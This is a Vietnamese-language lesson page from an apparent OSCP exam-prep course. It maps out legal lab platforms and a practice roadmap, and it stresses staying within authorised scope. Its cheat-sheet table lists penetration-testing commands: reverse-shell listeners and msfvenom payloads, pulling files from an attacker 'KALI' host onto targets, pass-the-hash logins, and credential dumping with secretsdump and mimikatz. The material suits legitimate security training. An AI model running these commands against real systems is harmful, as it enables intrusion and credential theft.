@@ -1,0 +1,175 @@
+---
+title: "Lộ trình luyện lab"
+code: "4.3"
+level: 4
+summary: "Đọc hết lý thuyết trong lộ trình này không làm bạn thi đỗ — kỹ năng chỉ hình thành khi tự tay luyện trên máy thật, và bài này chỉ ra luyện ở đâu, theo thứ tự nào, để không nản giữa đường."
+duration: "50 phút"
+updated: "2026-11-12"
+prereq: ["4.2"]
+objectives:
+  - "Biết tên và điểm mạnh riêng của từng nền tảng luyện tập hợp pháp"
+  - "Dựng được một lộ trình luyện từ dễ tới khó, có cả Active Directory"
+  - "Có một bản đồ phương pháp tổng hợp cả khoá để tra lại khi bế tắc"
+  - "Hiểu ranh giới giữa học nhóm có trách nhiệm và chia sẻ đáp án vi phạm quy định"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Checklist from '../../components/sim/Checklist.tsx';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Đọc sách nấu ăn không làm bạn thành đầu bếp. Phải đứng bếp, làm hỏng vài món, bị bỏng tay vài lần, rồi mới quen. Toàn bộ kiến thức ở các bài trước — liệt kê, khai thác web, leo thang, Active Directory — chỉ thật sự thành kỹ năng khi bạn tự tay gõ lệnh trên một máy lạ, không ai mách trước câu trả lời.
+
+Câu hỏi còn lại là: luyện ở đâu cho hợp pháp, và theo thứ tự nào để không nản giữa đường. Đó là nội dung của bài này.
+
+## Kiến thức chính
+
+### Các nền tảng hợp pháp (theo tên)
+
+| Nền tảng | Hợp cho | Ghi chú |
+|---|---|---|
+| **TryHackMe** | Người mới | Nhiều phòng có hướng dẫn từng bước, lý thuyết kèm thực hành |
+| **Hack The Box** (+ Academy) | Trung cấp trở lên | Máy không có hướng dẫn, phải tự mò; phần Academy có bài học lý thuyết |
+| **OffSec Proving Grounds** (Play/Practice) | Sát đề OSCP | Do chính OffSec vận hành, phong cách gần đề thi |
+| **VulnHub** | Tự dựng offline | Tải máy ảo do cộng đồng làm về chạy trong lab riêng của bạn |
+| **Lab chính thức của khoá OSCP** | Khi đã đăng ký | Mạng lab và tài liệu của OffSec |
+
+Điểm chung bắt buộc: chỉ tấn công những máy mà nền tảng cho phép bạn tấn công. Ra ngoài phạm vi đó vi phạm điều khoản và có thể vi phạm luật (bài 0.1 và trang Quy tắc).
+
+### Lộ trình luyện từ dễ tới khó
+
+1. Bắt đầu với phòng có hướng dẫn (TryHackMe) để quen quy trình.
+2. Chuyển sang máy dễ không hướng dẫn (HTB/PG "easy"), tự liệt kê và tìm đường.
+3. Tăng dần độ khó, tập **cả Linux lẫn Windows**.
+4. Làm riêng một mạch về **Active Directory** nhiều máy (bài 3.4, 3.5).
+5. Mỗi máy đều viết một báo cáo ngắn (bài 4.1), dù không ai yêu cầu.
+
+<Callout type="note" label="Luyện máy nào? Dùng danh sách tuyển sẵn của cộng đồng">
+Đừng chọn máy ngẫu nhiên. Cộng đồng OSCP có vài danh sách máy *được tuyển riêng vì giống phong cách đề thi*, cập nhật nhiều năm nay:<br />
+- <strong>Danh sách "TJ Null"</strong> (OSCP-like boxes): bảng các máy Hack The Box và Proving Grounds nên làm, chia theo Linux/Windows/AD — danh sách được nhắc đến nhiều nhất.<br />
+- <strong>Danh sách LainKusanagi</strong>: một bản tuyển tương tự, nhiều máy sát đề hơn nữa.<br />
+Cách dùng: lấy đúng danh sách, làm lần lượt từ dễ, đánh dấu máy đã xong, và ưu tiên các máy gắn nhãn AD khi tới bước 4. Làm hết phần "easy/medium" của một danh sách là đủ độ phủ cho kỳ thi hơn hẳn việc cày máy ngẫu nhiên.
+</Callout>
+
+<ConceptMap
+  client:visible
+  title="Lộ trình 4 giai đoạn làm chủ kỹ năng phòng thi (Lab Progression)"
+  width={680}
+  height={300}
+  zones={[
+    { label: "Giai đoạn Nền tảng & Máy đơn (Tuần 1 - 6)", x: 10, y: 10, w: 320, h: 270 },
+    { label: "Giai đoạn Thực chiến AD & Thi thử (Tuần 7 - 12)", x: 345, y: 10, w: 325, h: 270 },
+  ]}
+  nodes={[
+    { id: 'thm', label: '1. Khởi động có chỉ dẫn', sub: 'TryHackMe (20 phòng)', x: 170, y: 70, tone: 'accent', detail: 'Học cú pháp công cụ và làm quen với từng lỗ hổng có lời giải đi kèm. Làm chủ web exploit và leo quyền cơ bản.' },
+    { id: 'pg_easy', label: '2. Máy đơn không hướng dẫn', sub: 'TJ Null PG Practice (30 máy)', x: 170, y: 180, tone: 'warn', detail: 'Tự lập luận từ quét cổng đến lấy root. Rèn luyện phản xạ ghi chép và tự thoát bế tắc khi không có walkthrough.' },
+    { id: 'ad_set', label: '3. Cụm Active Directory', sub: 'Wreath / Throwback / HTB Pro', x: 507, y: 70, tone: 'warn', detail: 'Chinh phục mạng doanh nghiệp: Kerberoasting, AS-REP roasting, BloodHound, DCSync và leo Domain Controller.' },
+    { id: 'mock', label: '4. Diễn tập 24h mô phỏng', sub: 'OffSec Challenge Labs (OSCP A/B/C)', x: 507, y: 180, tone: 'bad', detail: 'Ngồi đúng 24h giải liên tục 3 máy đơn + 1 cụm AD, không tra cứu đáp án. Tự tay viết báo cáo hoàn chỉnh trong 24h tiếp theo.' },
+  ]}
+  edges={[
+    { from: 'thm', to: 'pg_easy' },
+    { from: 'pg_easy', to: 'ad_set' },
+    { from: 'ad_set', to: 'mock' },
+  ]}
+/>
+
+### Bản đồ phương pháp của cả khoá
+
+In ra và dán cạnh màn hình. Đây là toàn bộ lộ trình gói trong một quy trình:
+
+```text
+1. LIỆT KÊ NGOÀI
+   nmap -p-  →  nmap -sC -sV  →  (UDP top)           [bài 2.2]
+2. LIỆT KÊ TỪNG DỊCH VỤ
+   web: gobuster, robots.txt, phiên bản→searchsploit [2.2, 2.3, 2.5]
+   SMB: enum4linux, smbclient -N                     [2.2]
+   DNS: dig axfr                                      [1.3]
+3. KHAI THÁC ĐƯỜNG VÀO
+   lỗ hổng web (SQLi/LFI/command)  hoặc  CVE  hoặc
+   thông tin đăng nhập (hydra/thử lại)               [2.3, 2.5, 2.6]
+4. LEO THANG
+   Linux: linpeas, sudo -l, SUID/GTFOBins, cron, cap [3.1]
+   Windows: winpeas, whoami /priv, dịch vụ, creds    [3.2]
+5. SAU KHAI THÁC / LAN RỘNG
+   thông tin dùng lại, pivoting, Active Directory    [3.3, 3.4, 3.5]
+6. GHI CHÉP + BÁO CÁO (làm liên tục, không để cuối)  [0.3, 4.1]
+BẾ TẮC? → quay lại bước 2, liệt kê kỹ hơn.
+```
+
+### Bảng tra nhanh trước giờ thi
+
+Bản đồ trên cho biết *làm gì*; bảng này nhắc *gõ gì* ở những chỗ hay quên nhất khi căng thẳng. Mỗi dòng trỏ về bài có giải thích đầy đủ. Hãy tự chép lại thành ghi chú của riêng bạn, vì ghi chú tự viết mới tra nhanh được.
+
+| Tình huống | Lệnh mở màn | Bài |
+|---|---|---|
+| Quét đủ cổng | `nmap -p- --min-rate 2000 IP` rồi `nmap -p <cổng> -sC -sV IP` | 2.2 |
+| Dò thư mục web | `gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,txt` | 2.2 |
+| Chờ reverse shell | `nc -lvnp 443` | 2.7 |
+| Nâng TTY trên Linux | `python3 -c 'import pty;pty.spawn("/bin/bash")'`, `Ctrl+Z`, `stty raw -echo; fg` | 2.7 |
+| Đưa file lên máy Linux | Kali: `python3 -m http.server 80`; đích: `wget http://KALI/f -O /tmp/f` | 2.7 |
+| Đưa file lên máy Windows | `certutil -urlcache -f http://KALI/f.exe f.exe` hoặc `iwr http://KALI/f.exe -o f.exe` | 2.7 |
+| Lấy file từ máy Windows về | Kali: `impacket-smbserver share . -smb2support`; đích: `copy f \\KALI\share\` | 2.7 |
+| Payload Windows | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o rev.exe` | 3.7 |
+| Leo quyền Linux, nhìn trước | `sudo -l`; `find / -perm -4000 2>/dev/null`; `cat /etc/crontab`; `getcap -r / 2>/dev/null` | 3.1 |
+| Leo quyền Windows, nhìn trước | `whoami /priv`; `whoami /groups`; `systeminfo`; lịch sử PowerShell; `winPEAS` | 3.2 |
+| Có SeImpersonate | `PrintSpoofer64.exe -i -c cmd`, không được thì `GodPotato -cmd "..."` | 3.2 |
+| Bẻ hash | NTLM `-m 1000`, Net-NTLMv2 `-m 5600`, Kerberoast `-m 13100`, AS-REP `-m 18200` | 2.6, 3.5 |
+| Có tài khoản domain | `nxc smb DẢI -u user -p pass`; `bloodhound-python -c All`; `impacket-GetUserSPNs -request` | 3.4, 3.5 |
+| Có hash quản trị viên | `impacket-psexec -hashes :HASH dom/user@IP` hoặc `evil-winrm -i IP -u user -H HASH` | 3.5, 3.9 |
+| Vừa có quản trị cục bộ trên máy domain | `impacket-secretsdump dom/user:pass@IP` hoặc mimikatz `sekurlsa::logonpasswords` | 3.5 |
+| Cần vào mạng trong | ligolo-ng (proxy trên Kali, agent trên bàn đạp), hoặc `chisel` + `proxychains` | 3.3, 3.9 |
+| Chụp bằng chứng | Linux: `hostname; whoami; ip a; cat /root/proof.txt`. Windows: `hostname & whoami & ipconfig & type C:\Users\Administrator\Desktop\proof.txt` | 4.2 |
+
+<Checklist
+  client:visible
+  title="Tự đánh giá mức sẵn sàng"
+  storageKey="readiness"
+  items={[
+    { label: 'Tôi tự dựng lab và quay lại snapshot khi cần' },
+    { label: 'Tôi liệt kê một máy có hệ thống mà không cần nhắc' },
+    { label: 'Tôi tự tìm đường trên máy dễ Linux không cần hướng dẫn' },
+    { label: 'Tôi tự tìm đường trên máy dễ Windows không cần hướng dẫn' },
+    { label: 'Tôi nhận ra và khai thác được các dạng leo thang phổ biến' },
+    { label: 'Tôi làm được một bài mạng nhiều máy có pivoting' },
+    { label: 'Tôi hoàn thành một chuỗi tấn công Active Directory' },
+    { label: 'Tôi khai thác SQL injection bằng tay, không cần sqlmap' },
+    { label: 'Tôi đã làm thử một buổi 24 giờ: 3 máy đơn và một cụm AD, không dùng AI' },
+    { label: 'Tôi viết được báo cáo tái hiện được cho mỗi máy' },
+    { label: 'Tôi giữ được quy trình và bình tĩnh khi bế tắc' },
+  ]}
+/>
+
+### Học nhóm có trách nhiệm
+
+Học cùng người khác rất hiệu quả: chia sẻ cách tiếp cận, giải thích cho nhau. Nhưng với lab chính thức và kỳ thi OSCP, chia sẻ lời giải chi tiết thường vi phạm quy định. Hãy chia sẻ **cách tư duy và phương pháp**, không chia sẻ đáp án cụ thể của bài thi.
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Mỗi máy bạn luyện tấn công đều dạy một cách phòng thủ tương ứng. Sau khi chiếm được một máy, tự hỏi: lỗi này lẽ ra phòng bằng cách nào, phát hiện bằng cách nào. Tư duy này giúp bạn nếu sau làm ở đội phòng thủ, và làm báo cáo của bạn giá trị hơn nhiều.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Nhảy thẳng vào các máy mức khó ngay từ tuần đầu rồi đâm ra nản chí.** Khi chưa hình thành phản xạ liệt kê cơ bản mà đã đối mặt với những chuỗi lỗ hổng lắt léo, bạn sẽ thấy mọi thứ như ma trận; hãy đi từ các phòng có hướng dẫn sang máy dễ tự làm để tích lũy sự tự tin trước.
+- **Mở bài giải (write-up) ra đọc ngay sau 15 phút chưa tìm thấy đường vào.** Việc chép lại lệnh từ một bài hướng dẫn cho cảm giác "đã giải xong máy" rất nhanh, nhưng thực chất não bạn chưa hề rèn được kỹ năng tự đặt câu hỏi khi đứng trước một kết quả `nmap` trống trải. Chỉ nên đọc gợi ý từng phần sau khi đã tự xoay xở hết checklist mà vẫn kẹt.
+- **Giải được hàng chục máy lab nhưng chưa từng tự viết một bản báo cáo hoàn chỉnh nào.** Nhiều người chỉ thích cảm giác lấy được cờ `root.txt` rồi chuyển ngay sang máy mới, dẫn tới việc vào phòng thi thực tế bị lóng ngóng, chụp thiếu bằng chứng và mất quá nhiều giờ cho việc trình bày.
+- **Cày số lượng máy thật nhiều nhưng không bao giờ tổng kết lại nhật ký điểm yếu của bản thân.** Làm 50 máy mà không ghi chú lại "vì sao lúc đó mình bỏ sót lỗ hổng này" thì sang máy thứ 51 bạn vẫn sẽ lặp lại đúng điểm mù đó.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Thứ tự luyện tập hợp lý cho người mới là gì?', options: ['Bắt đầu từ máy khó nhất', 'Từ phòng có hướng dẫn, tới máy dễ tự làm, rồi tăng dần độ khó và AD', 'Chỉ làm Active Directory'], answer: 1, explain: 'Đi từ dễ tới khó xây quy trình và sự tự tin vững chắc.' },
+    { q: 'Nền tảng nào do chính OffSec vận hành và sát phong cách đề OSCP?', options: ['VulnHub', 'Proving Grounds', 'Một mạng công ty bất kỳ'], answer: 1, explain: 'Proving Grounds (Play/Practice) do OffSec vận hành, gần phong cách đề thi.' },
+    { q: 'Ranh giới khi học nhóm cho kỳ thi OSCP là gì?', options: ['Không được học nhóm', 'Chia sẻ cách tư duy thì được, chia sẻ đáp án bài thi thì không', 'Chia sẻ mọi thứ thoải mái'], answer: 1, explain: 'Phương pháp nên chia sẻ; lời giải chi tiết của bài thi thường vi phạm quy định.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Kỹ năng thực chiến chỉ hình thành khi bạn tự tay thực hành trên các nền tảng hợp pháp (TryHackMe, Hack The Box, OffSec Proving Grounds, VulnHub) và luôn tuân thủ nghiêm ngặt phạm vi cho phép.
+- Hãy đi theo lộ trình tăng dần độ khó: bắt đầu từ các phòng có hướng dẫn để quen tay, sang các máy đơn Linux và Windows tự giải, rồi tiến tới các cụm mạng nhiều máy và Active Directory.
+- Giữ bản đồ phương pháp cạnh màn hình để rèn phản xạ liệt kê bài bản, tập viết báo cáo ngắn cho từng máy đã giải, và khi học nhóm chỉ chia sẻ cách tư duy chứ không trao đổi đáp án đề thi.
